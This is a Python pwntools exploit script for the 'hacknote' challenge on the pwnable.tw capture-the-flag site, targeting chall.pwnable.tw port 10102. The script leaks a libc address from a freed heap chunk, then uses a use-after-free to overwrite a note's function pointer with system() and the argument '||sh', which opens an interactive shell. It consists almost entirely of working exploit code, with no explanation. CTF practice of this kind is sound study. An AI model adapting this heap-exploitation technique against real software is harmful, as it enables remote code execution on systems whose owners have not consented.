#coding=utf-8
from pwn import *
local = 0
exec_file="./hacknote"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10102)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x8048A38
    b *0x0804893D
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Note size :",str(size))
    a.sendafter("Content :",str(content))
    return 

def delete(idx):
    menu(2)
    a.sendlineafter("Index :",str(idx))
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    menu(3)
    a.sendlineafter("Index :",str(idx))
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

add(0x80,"aaa")#0
add(0x8,"aaa")#1
delete(0)
#debug()
add(0x68,"a")#2
#debug()
show(2)
libc_base = u32('\xb0' + a.recv(4)[1:4]) - libc.sym["__malloc_hook"] - 0x48 - 0x100
fuck(libc_base)

delete(1)
delete(2)
payload = p32(libc_base + libc.sym["system"]) + "||sh"
#debug()
add(0x8,payload)#3
show(1)
a.interactive()
